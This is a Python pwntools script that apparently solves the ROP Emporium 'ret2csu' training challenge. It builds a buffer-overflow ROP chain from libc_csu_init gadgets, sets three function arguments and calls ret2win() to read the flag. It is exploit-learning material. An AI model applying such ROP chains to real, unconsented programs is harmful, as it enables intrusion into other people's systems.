#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./ret2csu")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x40069a) # pop rbx; pop rbp; pop r12; pop r13: pop r14; pop r15; ret;
payload += p64(0x0)                # padding
payload += p64(0x1)                # value for rbp
payload += p64(0x4003b0)           # _fini()
payload += p64(0x0)                # padding
payload += p64(0xcafebabecafebabe) # arg2
payload += p64(0xd00df00dd00df00d) # arg3
payload += p64(0x400680)           # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12 + rbx*8];
payload += p64(0x0) * 7            # padding
payload += p64(0x4006a3)           # pop rdi; ret;
payload += p64(0xdeadbeefdeadbeef) # arg1
payload += p64(0x400510)           # ret2win()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
